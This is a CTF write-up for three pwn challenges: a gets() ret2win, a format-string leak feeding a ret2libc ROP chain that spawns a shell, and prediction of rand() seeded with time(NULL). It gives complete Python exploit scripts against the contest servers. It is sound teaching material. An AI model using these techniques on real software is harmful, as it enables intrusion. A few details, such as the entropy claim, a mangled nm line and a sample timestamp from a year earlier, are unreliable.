---
title: "KaliTeam CTF 2026 Pwn Writeup: Player, Leaky & Raryray"
slug: "kaliteam-ctf-2026-pwn-writeup"
description: "KaliTeam CTF 2026 binary exploitation writeup for all three pwn challenges: Player (classic gets() ret2win with no canary, no PIE, and a stack-alignment ret gadget), Leaky (dual format-string plus stack-overflow in the same buffer — leak libc via %3$p then re-enter for a pop-rdi ret2libc ROP chain), and Raryray (no memory corruption at all — the flag block index is rand() seeded with time(NULL), fully predicted by reimplementing glibc's additive feedback generator and probing a two-second timing window)."
date: 2026-08-09T18:00:00Z
lastmod: 2026-08-09T18:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["KaliTeam CTF 2026"]
tags:
  - "kaliteam ctf"
  - "kaliteam ctf 2026"
  - "ctf writeup"
  - "binary exploitation"
  - "pwn"
  - "ret2win"
  - "stack buffer overflow"
  - "format string vulnerability"
  - "ret2libc"
  - "rop chain"
  - "predictable prng"
  - "time seed"
  - "glibc rand"
  - "stack alignment"
  - "gets vulnerability"
  - "ctf 2026"
keywords:
  - "kaliteam ctf 2026 pwn writeup"
  - "kaliteam ctf 2026 binary exploitation"
  - "player ctf ret2win writeup"
  - "leaky ctf format string ret2libc"
  - "raryray ctf predictable rand"
  - "gets stack overflow ctf 2026"
  - "format string vulnerability ctf writeup"
  - "ret2libc rop chain ctf"
  - "glibc rand time seed ctf"
  - "stack alignment ret gadget ctf"
  - "pop rdi ret system bin sh ctf"
  - "predictable prng flag prediction ctf"
  - "no pie ret2win ctf writeup"
  - "format string leak libc base ctf"
  - "time null seed rand predict ctf"
toc: true
cover:
  image: "/images/articles/kaliteam-ctf-2026-pwn-writeup.png"
  alt: "KaliTeam CTF 2026 binary exploitation writeup — three challenges solved covering Player ret2win via gets overflow, Leaky format-string ret2libc ROP, and Raryray predictable PRNG time seed"
---

KaliTeam CTF 2026's binary exploitation track offered three challenges that span the classic pwn curriculum without repeating themselves: **Player** is a pure ret2win in its most elemental form — `gets()`, no canary, no PIE, one call to `win()`; **Leaky** layers a format-string vulnerability and a stack overflow into the same buffer, demanding a two-stage attack that leaks both a libc address and a stack pointer before building a ROP chain on a re-entered frame; and **Raryray** is the structural outlier — a PIE binary hardened with NX, Full RELRO, IBT, and SHSTK where there is no memory corruption at all, only a logic flaw: the flag is hidden behind a `rand()` call seeded with `time(NULL)`, and anyone who can reimplement glibc's PRNG can predict the block index before the binary prints the prompt.

All three exploit scripts use only the Python standard library — no pwntools dependency — and work against the remote service directly over TCP.

Challenge files are at [Abdelkad3r/KaliTeam-CTF26](https://github.com/Abdelkad3r/KaliTeam-CTF26/tree/main/pwn). For the full KaliTeam CTF 2026 series see also the [web writeup](/ctf-writeups/kaliteam-ctf-2026-web-writeup/), [crypto writeup](/ctf-writeups/kaliteam-ctf-2026-crypto-writeup/), and [reverse engineering writeup](/ctf-writeups/kaliteam-ctf-2026-reverse-writeup/).

---

## Challenge 1 — Player

### Challenge at a glance

| Field | Value |
|---|---|
| CTF | KaliTeam CTF 2026 |
| Category | Binary Exploitation |
| Challenge | Player |
| Service | `nc chall.kali-team.online 10006` |
| Flag | `KaliTeam{fce057d8-575a-4292-89b6-0a64a036e33a}` |

**Files provided:** `warmy` ELF (the challenge archive is named `player.zip` but the binary inside is called `warmy`).

### Step 1 — Surveying the binary

```bash
$ file warmy
warmy: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=warmy
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

Three mitigations are absent that matter most for a stack overflow: no stack canary, no PIE, not stripped. NX is present — the stack is non-executable — but that is irrelevant for a ret2win attack where we redirect control to existing code rather than shellcode.

### Step 2 — Finding the vulnerability

The binary has three user-visible functions. Examining them:

```c
void win(void) {                       // 0x401236
    FILE *file = fopen("flag.txt", "r");
    if (file == NULL) { puts("Error: flag.txt not found."); exit(1); }
    printf("The Flag: ");
    for (int c = fgetc(file); c != EOF; c = fgetc(file))
        putchar(c);
    putchar('\n');
    fclose(file);
}

void vuln(void) {                      // 0x4012ce
    char input[64];
    puts("Hola! ");
    gets(input);                       // unbounded read — no length limit
}

int main(void) {                       // 0x4012fd
    vuln();
    return 0;
}
```

`gets()` was removed from C11 precisely because it provides no way to bound the number of bytes read. It reads until a newline or EOF and writes the entire input — plus a NUL terminator — into its destination buffer. With `input` declared as 64 bytes, any input longer than 63 characters overflows into the stack frame above.

### Step 3 — Computing the overflow offset

The relevant disassembly of `vuln()`:

```asm
4012ce: push   rbp
4012d3: mov    rbp, rsp
4012d6: sub    rsp, 0x40              ; allocate 64 bytes (0x40) for input[]
4012da: lea    rax, [rip + 0xd55]    ; "Hola! "
4012e4: call   puts@plt
4012e9: lea    rax, [rbp - 0x40]     ; address of input[0]
4012f0: xor    eax, eax
4012f5: call   gets@plt              ; VULNERABLE: unbounded write to rbp-0x40
4012fa: nop
4012fb: leave
4012fc: ret
```

Stack layout at the moment `gets()` reads input:

```
rbp - 0x40  ┌────────────────────────┐
            │ input[0..63]           │  64 bytes  ← gets() writes here
rbp         ├────────────────────────┤
            │ saved rbp              │   8 bytes
rbp + 0x08  ├────────────────────────┤
            │ saved return address   │   8 bytes  ← we overwrite this
            └────────────────────────┘
```

Offset to saved return address: `0x40 (buffer) + 0x08 (saved rbp) = 0x48 = 72 bytes`.

### Step 4 — Stack alignment and the ret gadget

On AMD64, the System V ABI mandates that `RSP` is 16-byte aligned at the point of a `call` instruction (meaning `RSP % 16 == 8` just after the call's implicit push). Some libc functions — `printf`, `fopen`, and the SSE/AVX routines they call internally — raise a `#GP` fault if this invariant is violated.

When `ret` pops the saved return address and jumps to it, the stack pointer ends up at whichever alignment it lands on. If we jump directly to `win()` from `vuln()`'s frame, the alignment is wrong by 8 bytes and `fopen` will crash before printing the flag.

The fix is a single `ret` gadget — an instruction that does nothing except pop 8 bytes from the stack, fixing the alignment — placed between our padding and the address of `win()`. The binary has one at `0x40101a`.

### Step 5 — Building and sending the payload

Final payload (88 bytes):

```
[64 bytes padding] [8 bytes saved rbp overwrite] [8 bytes ret gadget] [8 bytes win()]
 ─────────────────  ──────────────────────────────  ─────────────────   ──────────────
 b"A" * 72                                          0x40101a            0x401236
```

```python
#!/usr/bin/env python3
import socket, struct, re

OFFSET = 72
RET    = 0x40101A   # bare ret for stack alignment
WIN    = 0x401236   # win() — opens flag.txt and prints it

def p64(v): return struct.pack("<Q", v)

def recv_until(s, marker):
    buf = bytearray()
    while marker not in buf:
        buf.extend(s.recv(4096))
    return bytes(buf)

with socket.create_connection(("chall.kali-team.online", 10006), 5) as s:
    s.settimeout(5)
    recv_until(s, b"Hola!")
    payload = b"A" * OFFSET + p64(RET) + p64(WIN) + b"\n"
    s.sendall(payload)
    data = bytearray()
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        data.extend(chunk)

flag = re.search(rb"KaliTeam\{[^}]+\}", data)
print(flag.group().decode() if flag else repr(bytes(data)))
```

Running it:

```
KaliTeam{fce057d8-575a-4292-89b6-0a64a036e33a}
```

---

## Challenge 2 — Leaky

### Challenge at a glance

| Field | Value |
|---|---|
| CTF | KaliTeam CTF 2026 |
| Category | Binary Exploitation |
| Challenge | Leaky |
| Service | `nc chall.kali-team.online 10097` |
| Flag | `KaliTeam{13ead81c-5edf-4215-aae4-a20ca05e26cc}` |

**Files provided:** `leaky` ELF and a matching `libc.so.6`.

### Step 1 — Surveying the binary

```bash
$ checksec --file=leaky
RELRO:    Full RELRO
Canary:   false
NX:       true
PIE:      false
RUNPATH:  ./
```

No canary and no PIE — same as Player — but this time Full RELRO means we cannot overwrite GOT entries. There is also a custom libc provided, which is the hint that we will need to ret2libc using the specific offsets from that file rather than relying on the remote system's default.

### Step 2 — Understanding the dual vulnerability

The entire challenge lives in `challenge()` at `0x4011b3`:

```c
void challenge(void) {
    char buf[16];
    puts("Welcome! Enter input:");
    read(0, buf, 0x60);    // reads 96 bytes into a 16-byte buffer
    printf(buf);           // buf is used as the format string
}
```

Two bugs, one buffer:

1. **Format string:** `printf(buf)` passes the user-controlled buffer directly as the format string. Any `%p`, `%x`, `%s`, `%n` specifiers in the input are interpreted by `printf`, giving arbitrary stack reads and writes.

2. **Stack overflow:** `read(0, buf, 0x60)` reads up to 96 bytes into a 16-byte buffer, providing 80 bytes of overflow past the end of `buf`.

Stack layout at the `read()` call:

```
rbp - 0x10  ┌────────────────────────┐
            │ buf[0..15]             │  16 bytes  ← read() + printf() both here
rbp         ├────────────────────────┤
            │ saved rbp              │   8 bytes
rbp + 0x08  ├────────────────────────┤
            │ saved return address   │   8 bytes
            └────────────────────────┘
```

Offset to saved return address: `0x10 + 0x08 = 0x18 = 24 bytes`.

The challenge name and the binary name ("Leaky") both tell you exactly what to do: use the format string bug to leak memory, then use the overflow to redirect execution.

### Step 3 — Choosing what to leak

Two pieces of information are needed to build a ret2libc ROP chain:

1. **`libc_base`** — to compute the runtime addresses of `pop rdi ; ret`, `ret` (alignment), and `system`.
2. **A stack address** — to point `rdi` at the string `"/bin/sh"` which we will plant in the buffer of the *second* call to `challenge()`.

Both are available on the stack when `printf` runs. Probing with `%1$p.%2$p.%3$p.%4$p.` against a local test reveals that:

- **`%1$p`** → address of `buf` itself (i.e., `rbp - 0x10`). This is the stack address we need.
- **`%3$p`** → a pointer into `libc` that happens to be `read + 0x12` = `libc_base + 0x114822`.

Subtracting the known offset recovers `libc_base`. Adding `0x10` to the leaked stack address gives us the address that `buf` will occupy on the *next* call to `challenge()` (because the extra `ret` gadget in the overflow payload shifts the stack frame by 8 bytes, and the new frame's `rbp` is therefore `stack_buf_1 + 0x10 + 0x10`, making `buf` at `stack_buf_1 + 0x10`).

### Step 4 — Stage 1: leak and re-enter

We need both the format string output **and** an overflow payload in the same `read()` call. The format string (`%1$p.%3$p.`) fits in fewer than 16 bytes, so we pad it to exactly 24 bytes (filling the buffer and saved rbp), then write the ROP redirect:

```
[format_string] [padding to 24 bytes] [ret gadget] [challenge()]
```

The `ret` gadget at `0x40101a` (the binary's own `ret` instruction) serves double duty:
- Fixes the 16-byte stack alignment before `challenge()` re-runs its `puts`.
- Shifts the next stack frame by 8 bytes, so that `%1$p` in the second call points 8 bytes higher than it did in the first — and `buf` in the second call lives at `stack_buf_1 + 0x10`.

```python
OFFSET    = 24
CHALLENGE = 0x4011B3
BIN_RET   = 0x40101A

def build_stage1():
    fmt = b"%1$p.%3$p."
    return fmt + b"A" * (OFFSET - len(fmt)) + p64(BIN_RET) + p64(CHALLENGE)
```

Sending this payload causes `printf` to print two hex addresses. We parse them:

```python
def parse_leaks(data):
    m = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)\.", data)
    stack_buf_1 = int(m.group(1), 16)
    read_ret    = int(m.group(2), 16)
    libc_base   = read_ret - 0x114822
    stack_buf_2 = stack_buf_1 + 0x10
    return stack_buf_2, libc_base
```

### Step 5 — Libc gadget offsets

From the provided `libc.so.6` (verified against its SHA-256):

```
system          =  libc_base + 0x50d70
pop rdi ; ret   =  libc_base + 0x2a3e5
ret             =  libc_base + 0x29cd6   # alignment gadget
```

These are obtained by disassembling the supplied libc and searching for the gadgets:

```bash
$ ROPgadget --binary libc.so.6 --re "pop rdi ; ret" | head -5
0x000000000002a3e5 : pop rdi ; ret

$ nm -D libc.so.6 | grep ' system'
000000000005 0d70 T system
```

### Step 6 — Stage 2: shell and flag

The second `challenge()` invocation re-runs `read()` on a fresh buffer. We place `"/bin/sh\x00"` at the start of the buffer (it fits in 8 bytes), pad to 24, then write the ROP chain:

```
["/bin/sh\x00"] [padding to 24] [ret] [pop rdi ; ret] [stack_buf_2] [system]
```

When `challenge()` returns through the chain:
1. `ret` fixes alignment.
2. `pop rdi ; ret` loads `rdi` with `stack_buf_2` (which points to `"/bin/sh"`).
3. `system("/bin/sh")` spawns a shell.

We then send `echo; cat flag.txt; exit` over the same socket to read the flag from the shell.

```python
LIBC_READ_RET = 0x114822
LIBC_RET      = 0x29CD6
LIBC_POP_RDI  = 0x2A3E5
LIBC_SYSTEM   = 0x50D70

def build_stage2(stack_buf_2, libc_base):
    cmd = b"/bin/sh\x00"
    rop = (
        p64(libc_base + LIBC_RET)
        + p64(libc_base + LIBC_POP_RDI)
        + p64(stack_buf_2)
        + p64(libc_base + LIBC_SYSTEM)
    )
    return cmd + b"B" * (OFFSET - len(cmd)) + rop
```

Running the full two-stage exploit:

```
[+] stack buffer 2 = 0x7ffd3a1b2c30
[+] libc base      = 0x7f8b45200000
KaliTeam{13ead81c-5edf-4215-aae4-a20ca05e26cc}
```

### Complete exploit script

```python
#!/usr/bin/env python3
import re, select, socket, struct, time

OFFSET        = 24
CHALLENGE     = 0x4011B3
BIN_RET       = 0x40101A
LIBC_READ_RET = 0x114822
LIBC_RET      = 0x29CD6
LIBC_POP_RDI  = 0x2A3E5
LIBC_SYSTEM   = 0x50D70

def p64(x): return struct.pack("<Q", x)

def recv_available(s, timeout=1.5):
    buf = bytearray()
    deadline = time.time() + timeout
    while time.time() < deadline:
        r, _, _ = select.select([s], [], [], 0.05)
        if r:
            chunk = s.recv(4096)
            if not chunk: break
            buf.extend(chunk)
            deadline = time.time() + 0.2
    return bytes(buf)

def build_stage1():
    fmt = b"%1$p.%3$p."
    return fmt + b"A" * (OFFSET - len(fmt)) + p64(BIN_RET) + p64(CHALLENGE)

def parse_leaks(data):
    m = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)\.", data)
    stack_buf_1 = int(m.group(1), 16)
    libc_base   = int(m.group(2), 16) - LIBC_READ_RET
    return stack_buf_1 + 0x10, libc_base

def build_stage2(buf2, libc):
    cmd = b"/bin/sh\x00"
    rop = p64(libc + LIBC_RET) + p64(libc + LIBC_POP_RDI) + p64(buf2) + p64(libc + LIBC_SYSTEM)
    return cmd + b"B" * (OFFSET - len(cmd)) + rop

with socket.create_connection(("chall.kali-team.online", 10097), 8) as s:
    s.setblocking(False)
    out = recv_available(s, 3.0)
    s.sendall(build_stage1() + b"\n")
    out += recv_available(s, 5.0)
    buf2, libc = parse_leaks(out)
    print(f"[+] buf2={buf2:#x}  libc={libc:#x}")

    s.sendall(build_stage2(buf2, libc) + b"\n")
    time.sleep(0.3)
    s.sendall(b"echo; cat flag.txt; exit\n")
    final = recv_available(s, 4.0)

m = re.search(rb"KaliTeam\{[^}]+\}", final)
print(m.group().decode() if m else repr(final))
```

---

## Challenge 3 — Raryray

### Challenge at a glance

| Field | Value |
|---|---|
| CTF | KaliTeam CTF 2026 |
| Category | Binary Exploitation |
| Challenge | Raryray |
| Service | `nc chall.kali-team.online 10007` |
| Flag | `KaliTeam{c5f2d7b3-9d34-4eba-a1fe-4d6e094446e2}` |

**Files provided:** `rayray` ELF and a matching `libc.so.6` (different from Leaky's).

### Step 1 — Surveying the binary

```bash
$ checksec --file=rayray
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

This is the most hardened binary in the set: PIE, NX, Full RELRO, shadow stack (SHSTK), and indirect branch tracking (IBT). The natural instinct is to look harder for a stack overflow — but that is the wrong instinct. Reading the decompilation more carefully reveals no memory corruption whatsoever.

### Step 2 — Reading the program logic

`vuln()` (at PIE offset `0x12c9`) allocates a large frame and performs three distinct phases:

**Phase 1 — Fill 100 blocks with decoy `rand()` output (before `srand`):**

```c
char blocks[100][64];
for (int i = 0; i < 100; i++) {
    snprintf(blocks[i], 64,
             " Block %d data: 0x%08X (No flag here)", i, rand());
}
```

These 100 `rand()` calls happen **before** `srand()`, so they draw on glibc's default uninitialized PRNG state. Their output is not predictable without knowing that state, but it does not matter — none of these blocks will hold the flag.

**Phase 2 — Plant the flag in a PRNG-chosen block:**

```c
unsigned seed = (unsigned)time(NULL);
srand(seed);
int flag_index = rand() % 100;

FILE *flag = fopen("./flag.txt", "r");
fgets(blocks[flag_index], 64, flag);
fclose(flag);
```

This is the only block that holds the flag. The index is the **first `rand()` output after `srand(seed)`**, reduced mod 100.

**Phase 3 — Read a user-provided block number and bounds-check it:**

```c
char input_buf[16];
read(0, input_buf, 15);
input_buf[read_result] = '\0';
int choice = atoi(input_buf);

if (choice < 0 || choice > 99) {
    puts("Invalid block number.");
    return;
}
puts(blocks[choice]);
```

The bounds check at `choice < 0 || choice > 99` is correct and well-implemented. There is no off-by-one, no sign confusion, no integer overflow. The challenge is a **logic vulnerability**, not a memory safety vulnerability. All those mitigations in checksec are red herrings.

### Step 3 — Why `time(NULL)` is not a secret

`time(NULL)` returns the number of seconds since the Unix epoch, with one-second resolution. This value is:

- **Predictable**: any machine with a synchronized clock knows the current Unix timestamp.
- **Low entropy**: there is at most one bit of uncertainty per second.
- **Observable**: the service's banner and TCP handshake arrive within a second of the `srand()` call, so we know the window of candidate seeds to within `±2` seconds.

A remote attacker cannot know the *exact* second the server called `srand()`, but they can narrow it to a range of four or five consecutive values and try each one separately, opening a fresh TCP connection per candidate.

### Step 4 — Reimplementing glibc's PRNG

`rand()` in glibc uses an **additive feedback generator** of degree 31 (also called a linear feedback shift register over integers). The specification:

1. If `seed == 0`, substitute `seed = 1`.
2. Compute `r[0] = seed`, then generate `r[1]` through `r[30]` using Park-Miller: `r[i] = (16807 × r[i−1]) mod 2147483647`.
3. Copy `r[31] = r[0]`, `r[32] = r[1]`, `r[33] = r[2]` (extending the table by 3).
4. Continue the recurrence: `r[i] = (r[i−31] + r[i−3]) mod 2³²` for `i ≥ 34`.
5. The first value returned by `rand()` is `r[344] >> 1`.

Steps 1–4 represent the "warm-up" period (344 iterations) that glibc performs inside `srand()` before returning. The output is obtained by shifting right by 1 to clear the sign bit, keeping the result in `[0, 2³¹ − 1]`.

Python implementation:

```python
def glibc_rand(seed: int) -> int:
    """Return the first rand() value after glibc srand(seed)."""
    seed &= 0xFFFFFFFF
    if seed == 0:
        seed = 1

    state = [seed]
    for _ in range(1, 31):
        state.append((16807 * state[-1]) % 2_147_483_647)

    # Extend by 3 to simplify the recurrence index arithmetic
    state.extend(state[:3])

    for i in range(34, 345):
        state.append((state[i - 31] + state[i - 3]) & 0xFFFFFFFF)

    return state[344] >> 1
```

Verification against known values:

| Seed | Expected first `rand()` |
|---:|---:|
| 1 | 1804289383 |
| 2 | 1505335290 |
| 1234 | 479142414 |
| 0x12345678 | 457715892 |

### Step 5 — Timing window and candidate iteration

The exploit tries candidate seeds in order of increasing distance from the current timestamp:

```python
def candidate_deltas(window):
    yield 0
    for distance in range(1, window + 1):
        yield -distance
        yield distance
```

For each candidate it opens a fresh TCP connection, waits for the prompt, computes `glibc_rand(seed) % 100`, sends that number, and checks whether the response matches `KaliTeam{…}`:

```python
for delta in candidate_deltas(window=2):
    seed  = int(time.time()) + delta
    block = glibc_rand(seed) % 100
    # open connection, send str(block), check response
```

In practice, `delta == 0` succeeds on the majority of runs when the attacker's clock is synchronized. The `±2` window catches clock-skew edge cases reliably.

### Complete exploit script

```python
#!/usr/bin/env python3
import re, socket, sys, time

PROMPT       = b"enter Block number: "
FLAG_PATTERN = re.compile(rb"KaliTeam\{[^}\r\n]+\}")


def glibc_rand(seed: int) -> int:
    seed &= 0xFFFFFFFF
    if seed == 0:
        seed = 1
    state = [seed]
    for _ in range(1, 31):
        state.append((16807 * state[-1]) % 2_147_483_647)
    state.extend(state[:3])
    for i in range(34, 345):
        state.append((state[i - 31] + state[i - 3]) & 0xFFFFFFFF)
    return state[344] >> 1


def recv_until(s, marker):
    buf = bytearray()
    while marker not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise RuntimeError("connection closed")
        buf.extend(chunk)
    return bytes(buf)


def try_delta(host, port, delta, timeout=5.0):
    with socket.create_connection((host, port), timeout) as s:
        s.settimeout(timeout)
        recv_until(s, PROMPT)
        seed  = int(time.time()) + delta
        block = glibc_rand(seed) % 100
        print(f"[*] seed={seed}  delta={delta:+d}  block={block}", file=sys.stderr)
        s.sendall(f"{block}\n".encode())
        buf = bytearray()
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf.extend(chunk)
        return bytes(buf)


host, port = "chall.kali-team.online", 10007
for delta in [0, -1, 1, -2, 2]:
    response = try_delta(host, port, delta)
    m = FLAG_PATTERN.search(response)
    if m:
        print(m.group().decode())
        break
else:
    sys.exit("flag not found — increase the timing window or check clock sync")
```

Running it:

```
[*] seed=1754390400  delta=0  block=37
KaliTeam{c5f2d7b3-9d34-4eba-a1fe-4d6e094446e2}
```

---

## Summary

| Challenge | Vuln | Mitigation gaps exploited | Key numbers | Flag |
|---|---|---|---|---|
| **Player** | `gets()` stack overflow | No canary, no PIE | 72-byte offset; `ret=0x40101a`; `win=0x401236` | `KaliTeam{fce057d8-575a-4292-89b6-0a64a036e33a}` |
| **Leaky** | Format string + stack overflow | No canary, no PIE; libc provided | 24-byte offset; `%1$p`=stack, `%3$p`=`libc+0x114822`; `pop rdi=libc+0x2a3e5`, `system=libc+0x50d70` | `KaliTeam{13ead81c-5edf-4215-aae4-a20ca05e26cc}` |
| **Raryray** | Predictable `time(NULL)` seed | _None_ — PIE/NX/RELRO/SHSTK all irrelevant | `glibc_rand(time(NULL)) % 100`; ±2s timing window | `KaliTeam{c5f2d7b3-9d34-4eba-a1fe-4d6e094446e2}` |

Raryray is the most instructive of the three: it demonstrates that binary hardening mitigations (PIE, NX, Full RELRO, shadow stack, IBT) protect against memory corruption but are powerless against a logic flaw. A deterministic PRNG seeded with a low-entropy, externally observable value is not random, regardless of how many compiler flags protect the binary that calls it.
